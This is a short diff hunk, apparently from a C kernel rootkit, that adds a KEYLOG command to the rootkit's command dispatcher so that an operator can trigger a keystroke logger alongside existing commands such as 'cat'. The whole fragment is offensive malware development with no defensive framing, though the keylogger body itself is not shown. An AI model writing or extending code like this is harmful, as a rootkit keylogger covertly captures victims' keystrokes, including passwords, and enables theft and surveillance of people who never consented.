@@ -16,6 +16,10 @@ void rootkit_handler(struct work_struct* work) {
             DEBUG_PRINTF("rootkit: cat command: %s \n", args->string);
             cat_command(args);
             break;
+        case KEYLOG:
+            DEBUG_PRINTF("rootkit: keylog command: %s \n", args->string);
+            keylog_command(args);
+            break;
         default:
             DEBUG_PUTS("rootkit: invalid command\n")
             send_response("rootkit: invalid command", args);
